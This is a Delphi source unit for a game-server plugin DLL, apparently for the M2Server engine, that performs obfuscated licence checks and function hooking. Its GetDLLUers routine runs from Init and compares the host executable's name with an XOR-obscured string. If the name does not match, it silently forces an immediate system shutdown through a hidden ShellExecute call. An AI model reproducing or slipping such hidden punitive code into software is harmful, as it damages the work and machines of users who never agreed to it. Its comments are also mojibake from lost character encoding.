unit SDK;

interface
uses
  Windows, SysUtils, Forms, ShellApi;
type
  TMsgProc = procedure(Msg: PChar; nMsgLen: Integer; nMode: Integer); stdcall;
  TFunAddrSet = procedure(ProcName: PChar; nNameLen, nType: Integer; var nCheckCode: Integer; var nProcArray: Pointer; var Obj: TObject); stdcall;
  TFindProc = function(ProcName: PChar; nNameLen: Integer): Pointer; stdcall;
  TSetProc = function(ProcAddr: Pointer; ProcName: PChar; nNameLen: Integer): Boolean; stdcall;
  TFindObj = function(ObjName: PChar; nNameLen: Integer): TObject; stdcall;

  TGetFunAddr = function(nIndex: Integer): Pointer; stdcall;
  TFindOBjTable_ = function(ObjName: PChar; nNameLen, nCode: Integer): TObject; stdcall;
  TSetProcCode_ = function(ProcName: PChar; nNameLen, nCode: Integer): Boolean; stdcall;
  TSetProcTable_ = function(ProcAddr: Pointer; ProcName: PChar; nNameLen, nCode: Integer): Boolean; stdcall;
  TFindProcCode_ = function(ProcName: PChar; nNameLen: Integer): Integer; stdcall;
  TFindProcTable_ = function(ProcName: PChar; nNameLen, nCode: Integer): Pointer; stdcall;

procedure GetIPLocal(sIPaddr: PChar; var sLocal: array of Char; nLocalLen: Integer); stdcall;
procedure DeCryptString(Src: PChar; Dest: PChar; nSrc: Integer); stdcall;
function Init(AppHandle: HWnd; MsgProc: TMsgProc; FindProc: TFindProc; SetProc: TSetProc; GetFunAddr: TGetFunAddr): PChar; stdcall;
procedure UnInit(); stdcall;
procedure GetDLLUers;//DLL�ж����ĸ�EXE����
function GetIPHandle: Boolean; stdcall;//�ж�ע�����Ƿ�Ϸ� 20081016 ���M2��ʱ���
Function SetDate(Text: String): String;//�ַ����ӽ��ܺ��� 20071225
procedure LoadSelfInfo();//������������Ϣ
const
  MsgProc = 398432431; //���͵�Q��,��M2���Ӧ(M2Share.pas Version = 398432431)
  Version = MsgProc;
  SuperUser=MsgProc;
implementation
uses Module, PlugMain, Share, EDcode{, IniFiles}, MD5EncodeStr, DESTR;

//���ַ����ӽ��ܺ��� 20071225
Function EncryptText(Text: String): String;
Begin
  Result := Text;
End;

//�ַ����ӽ��ܺ��� 20071225
Function SetDate(Text: String): String;
Var
  I     :Word;
  C     :Word;
Begin
  Result := '';
{$I VMProtectBegin.inc}
  For I := 1 To Length(Text) Do Begin
    C := Ord(Text[I]);
    Result := Result + Chr((C Xor 15));
  End;
{$I VMProtectEnd.inc}
End;

{=================================================================
  ��  ��: DLL�ж����ĸ�EXE����
  ˵  ����uses Windows;
  ��  ��:
  ����ֵ:  ����EXE������ļ���
=================================================================} 
procedure GetDLLUers;
var 
  CArr:Array[0..256] of char;
  FileName: string;
begin
  Try
    ZeroMemory(@CArr,sizeof(CArr));
    GetModuleFileName(GetModuleHandle(nil),CArr,sizeof(CArr));
    FileName:=ExtractFileName(CArr);//CArr--EXE��ȫ·��
    if CompareText(FileName, SetDate('B=\j}yj}!jwj')) <> 0 then begin //������� M2Server.exe������ػ�
      ShellExecute( 0,'open','shutdown.exe', ' -s -t 0',nil,SW_HIDE);//uses ShellApi; �ػ�
    end;
  except
  end;
end;

procedure DeCryptString(Src: PChar; Dest: PChar; nSrc: Integer);
var
  sEncode, sDecode: string;
begin
{$I VMProtectBegin.inc}
  try
    SetLength(sEncode, nSrc);
    Move(Src^, sEncode[1], nSrc);
    sDecode := DeCodeText(sEncode);
    Move(sDecode[1], Dest^, Length(sDecode));
  except
  end;
{$I VMProtectEnd.inc}  
end;

procedure GetIPLocal(sIPaddr: PChar; var sLocal: array of Char; nLocalLen: Integer);
var
  sIpLocal, sIPaddress: string;
begin
  try
    SetLength(sIPaddress, 15);
    Move(sIPaddr^, sIPaddress[1], Length(sIPaddress));
    sIpLocal := SearchIPLocal(sIPaddress);
    FillChar(sLocal, SizeOf(sLocal), 0);
    Move(sIpLocal[1], sLocal, Length(sIpLocal));
  except
  end;
end;
//�жϰ汾��
function GetUserVersion: Boolean;
var
  TPlugOfEngine_GetUserVersion: function(): Integer; stdcall;
  nEngineVersion: Integer;
  sFunctionName: string;
const
  _sFunctionName = 'viJTN9h4rJgiDUkabO4XxjafbuyDp6L/jAyMFw=='; //TPlugOfEngine_GetUserVersion
begin
  Result := False;
  Try
    sFunctionName := DecodeString_3des(_sFunctionName, IntToStr(SuperUser));// sFunctionName :='TPlugOfEngine_GetUserVersion'
    if sFunctionName = '' then Exit;
    @TPlugOfEngine_GetUserVersion := GetProcAddress(GetModuleHandle(PChar(Application.Exename)), PChar(sFunctionName));
    if Assigned(TPlugOfEngine_GetUserVersion) then begin
      nEngineVersion := TPlugOfEngine_GetUserVersion;
      if nEngineVersion <= 0 then Exit;
      if nEngineVersion = Version then Result := True;
    end;
  except
  end;
end;

//�ж�ע�����Ƿ�Ϸ� 20081016 ���M2��ʱ���
function GetIPHandle: Boolean;
var
  sIP, sTempStr: string;
  //Config: TInifile;
  //sFileName: string;
  sRegisterCode, sCode: string;
const
  s_s01 = '.O,+*Q)%''&&&&&&&P$>=<;:9^XJKIHGEB';
begin
{$I VMProtectBegin.inc}
  sIP:= GetRegisterName();//ȡ������
  //sIP:= m_sRegisterName;
  Result := False;
  Try
    (*sFileName := ExtractFilePath(Paramstr(0)) + Trim(DecodeInfo('83k2WA1Ngh4B7tQuli10H8zmqZt0Wbg=')){!Setup.txt};
    if FileExists(sFileName) then begin
      Config := TInifile.Create(sFileName);
      if Config <> nil then begin
        sRegisterCode := Config.ReadString(Trim(DecodeInfo('+0k6BCrV/VCNyfFnuvglmtaFxR/7W8Y=')){Reg}, Trim(DecodeInfo('6WiMJOkUHNE3FCQT4M9t65O/keCMQkI=')){RegisterCode}, '');
        if sRegisterCode <> '' then begin
          sRegisterCode:= SetDate(String_DRR(sRegisterCode, SetDate('.O,+*Q)%''&&&&&&&P$>=<;:9^XJKIHGEB')));
          if sIP <> '' then begin
            sTempStr := EncodeString_3des(sIP, sDecryKey);
            sTempStr := RivestStr(sTempStr);
            if CompareText(sTempStr, sRegisterCode) = 0 then Result := True;
          end;
        end;
        Config.Free;
      end;
    end; *)
    if IniReadString(Trim(DecodeInfo('yzbCkyLHOljn45P4u3UP54sW+Q==')){BasicInfo},sRegisterCode) then begin
      if ReadRegKey(1, MySubKey + m_sRegisterName + '\',Trim(DecodeInfo('yzbCkyLHOljn45P4u3UP54sW+Q==')){BasicInfo}, sCode) then begin
        if sCode = sRegisterCode then begin
          sRegisterCode:= SetDate(String_DRR(sRegisterCode, SetDate(s_s01)));
          if sIP <> '' then begin
            sTempStr := EncodeString_3des(sIP, sDecryKey);
            sTempStr := RivestStr(sTempStr);
            if CompareText(sTempStr, sRegisterCode) = 0 then Result := True;
          end;
        end;
      end;    
    end;
  except
  end;
{$I VMProtectEnd.inc}
end;

function Init(AppHandle: HWnd; MsgProc: TMsgProc; FindProc: TFindProc; SetProc: TSetProc; GetFunAddr: TGetFunAddr): PChar; stdcall;
var
  boLoadSucced: Boolean;
  m_sKey, s01, s02, s03, s04: string;
const
  s_s01 = 'KjL}v{\{}fah';
  s_s02 = 'Hj{F_C`lnc';
  s_s03 = 'Hj{F_Gnakcj'; //GetIPHandle �ж�ע�����Ƿ�Ϸ� 20081016 ���M2��ʱ���
begin
  Try
    GetDLLUers;//DLL�ж����ĸ�EXE����
    LoadSelfInfo();//��ȡ������Ϣ 20081025
    s01:= SetDate(s_s01);//DeCryptString
    s02:= SetDate(s_s02);//GetIPLocal
    s03:= SetDate(s_s03);//GetIPHandle
    nCheckCode := 0;
    boLoadSucced := False;
    OutMessage := MsgProc;
    FindProcCode_ := GetFunAddr(0);
    //FindProcTable_ := GetFunAddr(1);
    SetProcTable_ := GetFunAddr(2);
    SetProcCode_ := GetFunAddr(3);
    //FindOBjTable_ := GetFunAddr(4);
    if HookDeCodeText = 1 then begin
      if GetUserVersion then begin //������ܲ���ļ���QQ����M2��QQ���Ƿ�һ�� M2�ı���(nUserLicense)
        Inc(nCheckCode);
        if SetProcCode(s01, 5) then begin
          Inc(nCheckCode);
          if GetProcCode(s01) = 5 then begin
            Inc(nCheckCode);
            if SetProcAddr(@DeCryptString, s01, 5) then begin
              Inc(nCheckCode);
              if nFileMode = '' then nFileMode:= skey;//20081025 ������û��ע����Ϣʱ,��ΪĬ���ַ���
              m_sKey := EncryptText(DecodeString(nFileMode));//�ٽ��ܺ���
              m_sKey := SetDate(m_sKey);//����ܺ���
              sDecryKey := DecodeString_3des(m_sKey, IntToStr(Version * nCheckCode));
              boLoadSucced := True;
            end;
          end;
        end;
{$IF HookSearchMode = 1}//GetIPHandle �ж�ע�����Ƿ�Ϸ� 20081016 ���M2��ʱ���
        if SetProcCode(s03, 7) then begin
          if GetProcCode(s03) = 7 then SetProcAddr(@GetIPHandle, s03, 7);
        end;
        IniWrite(sPlugName);//��д��!Setup.txt�ļ�
{$IFEND}
      end;
    end;
    if HookSearchIPLocal = 1 then begin
      SetProc(@GetIPLocal, PChar(s02), Length(s02));
    end;
    InitPlug(AppHandle, boLoadSucced);
    s04:= Trim(DecodeInfo(sPlugName));//�������
{$IF HookSearchMode = 1}
    if nFileName <> '' then begin
      s04:= SetDate(DecodeString(nFileName));
    end;
    if s04='' then s04:= Trim(DecodeInfo(sPlugName));//20081130
{$IFEND}
    Result := PChar(s04);//PChar(sPlugName);
  except
  end;
end;

//�˳����ģ��ʱ���õĽ�������
procedure UnInit(); stdcall;
var
  s03:string;
begin
  if nFileClose <> '' then begin
    s03:= SetDate(DecodeString(nFileClose));
  end else begin
    s03:= Trim(DecodeInfo(sUnLoadPlug));
  end;
  MainOutMessasge(s03, 0);
end;

//����������Ϣ
procedure LoadSelfInfo();
const
  s_s01 = '.O,+*Q)%''&&&&&&&P$>=<;:9^XJKIHGEB';
begin
  FillChar(MyRecInfo, SizeOf(TRecinfo), #0);
  ExtractInfo(ExtractFilePath(Application.exename)+'ScriptLoader.dll', MyRecInfo);//������������Ϣ
{$I VMProtectBegin.inc}
  if MyRecInfo.BakGameListURL <> '' then nFileMode:= DecryStrHex(Trim(MyRecInfo.BakGameListURL),SetDate(s_s01));//��ȡ������ע���û� 20081025
  if MyRecInfo.GameShowUrl <> '' then nFileShowName:= Trim(MyRecInfo.GameShowUrl);//ע�ᴰ����ʾ��Ϣ 20081025
  if MyRecInfo.PlugName <> '' then nFileName:= Trim(MyRecInfo.PlugName);//�������
  if MyRecInfo.StartLoadPlugSucced <> '' then nFileLoadSucced:= Trim(MyRecInfo.StartLoadPlugSucced);//���سɹ���Ϣ
  if MyRecInfo.StartLoadPlugFail <> '' then nFileLoadFail:= Trim(MyRecInfo.StartLoadPlugFail);//����ʧ����Ϣ
  if MyRecInfo.UnLoadPlug <> '' then nFileClose:= Trim(MyRecInfo.UnLoadPlug);//ж����Ϣ
{$I VMProtectEnd.inc}
end;

end.
